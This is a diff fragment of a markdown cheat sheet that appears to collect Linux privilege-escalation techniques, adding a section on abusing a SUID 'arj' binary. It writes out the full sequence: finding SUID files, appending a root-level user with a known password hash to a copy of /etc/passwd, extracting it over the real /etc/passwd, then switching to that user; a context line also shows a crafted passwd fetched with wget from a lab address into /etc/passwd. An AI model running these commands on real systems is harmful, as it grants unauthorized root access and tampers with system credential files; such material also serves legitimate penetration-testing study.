@@ -84,3 +84,20 @@ $ wget http://192.168.49.60/passwd -O /etc/passwd
 $ su ch
 password:pass123
 ```
+
+### arj
+
+```
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/arj
+
+$ cd /tmp
+$ cp /etc/passwd passwd
+$ echo "ch:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd
+$ arj a priv passwd
+$ arj x priv.arj /etc/
+→ Yes
+
+$su ch
+Password: pass123
+```
